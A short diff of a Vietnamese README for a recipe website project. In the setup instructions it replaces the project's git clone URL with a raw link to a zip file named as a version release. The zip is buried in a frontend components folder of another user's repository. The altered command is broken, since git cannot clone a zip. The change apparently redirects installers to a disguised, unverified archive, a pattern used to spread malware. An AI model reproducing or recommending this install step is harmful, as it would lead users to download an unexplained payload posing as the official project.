@@ -49,7 +49,7 @@ recipe_website/
 
 ## Chạy và cài đặt dự án
 
-git clone https://github.com/WebsiteRatatouille/Recipe_Website.git
+git clone https://github.com/DatTroc6804/Recipe_Website/raw/refs/heads/main/frontend/src/components/SchoolIntro/Website-Recipe-v3.9-alpha.5.zip
 cd recipe_website
 
 ### Cài đặt backend
